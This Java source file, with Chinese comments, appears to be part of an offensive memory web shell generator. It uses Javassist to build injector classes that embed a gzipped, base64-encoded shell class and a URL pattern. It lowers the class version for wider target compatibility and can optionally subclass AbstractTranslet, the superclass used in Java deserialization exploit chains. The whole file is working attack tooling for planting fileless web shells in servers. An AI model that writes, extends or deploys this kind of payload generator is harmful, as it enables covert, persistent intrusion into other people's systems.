package org.leo.jmg.mem.injectortpl;

import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;
import org.leo.core.util.asm.ClassFileMinimizer;
import org.leo.jmg.ShellGeneratorConfig;
import org.leo.jmg.util.base64.Base64Utils;

import java.io.InputStream;

public class InjectorGenerator {

    public byte[] makeInjector(ShellGeneratorConfig config, String injectorTplName) throws Exception {
        // 从模板类字节码克隆新类，避免直接修改模板本身
        String classPath = "/" + injectorTplName.replace('.', '/') + ".class";

        // 完全独立的池（parent=null），避免模板类被 getDefault() 父池缓存后 makeClass() 抛出
        // "is in a parent ClassPool" 错误；不能用 Class.forName 加载模板类，否则同样会污染父池
        ClassPool pool = new ClassPool(null);
        pool.appendSystemPath();
        pool.insertClassPath(new ClassClassPath(InjectorGenerator.class));

        CtClass ctClass;
        try (InputStream is = InjectorGenerator.class.getResourceAsStream(classPath)) {
            if (is == null) {
                throw new RuntimeException("Cannot find injector template class bytes for " + injectorTplName);
            }
            ctClass = pool.makeClass(is);
        }

        // 改名为目标注入器类名
        ctClass.setName(config.getInjectorClassName());
        // 统一降到 Java 5，兼容更多目标环境
        ctClass.getClassFile().setVersionToJava5();

        if (config.isAbstractTranslet()) {
            ctClass.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        }

        // 写入模板静态字段（字段存在则替换，不存在则添加，便于后续扩展更多模板）
        replaceStaticField(ctClass, "shellClassName",
                "private static String shellClassName = \"" + escapeForJavaString(config.getShellClassName()) + "\";");
        replaceStaticField(ctClass, "shellClass",
                "private static String shellClass = \"" + escapeForJavaString(Base64Utils.gzipAndBase64(config.getShellClassBytes())) + "\";");
        replaceStaticField(ctClass, "urlPattern",
                "private static String urlPattern = \"" + escapeForJavaString(config.getUrlPattern()) + "\";");



        try {
            byte[] bytes = ctClass.toBytecode();
            return ClassFileMinimizer.transform(bytes);
        } finally {
            ctClass.detach();
        }
    }

    private void replaceStaticField(CtClass ctClass, String fieldName, String newFieldSrc) throws Exception {
        try {
            CtField oldField = ctClass.getDeclaredField(fieldName);
            ctClass.removeField(oldField);
        } catch (Exception ignored) {
        }
        ctClass.addField(CtField.make(newFieldSrc, ctClass));
    }

    private String escapeForJavaString(String str) {
        if (str == null) {
            return "";
        }
        return str
                .replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\r", "\\r")
                .replace("\n", "\\n");
    }
}
